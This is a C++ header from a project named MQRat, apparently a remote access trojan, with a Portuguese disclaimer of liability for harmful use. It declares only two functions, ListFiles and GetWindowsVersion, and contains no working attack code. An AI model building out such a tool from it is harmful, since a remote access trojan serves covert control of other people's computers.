/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#ifndef API_HPP
#define API_HPP

#include <vector>
#include <string>

#define UNUSED(x)   (void)x

namespace API {
    class FileSystem {
        public:
            /**
             * @brief List all files in current directory
             * 
             * @return std::vector<std::string> 
             */
            static void *ListFiles(void*);

            /**
             * @brief Get the Windows Version object
             * 
             * @return std::string 
             */
            static void *GetWindowsVersion(void *);
    };
}

#endif

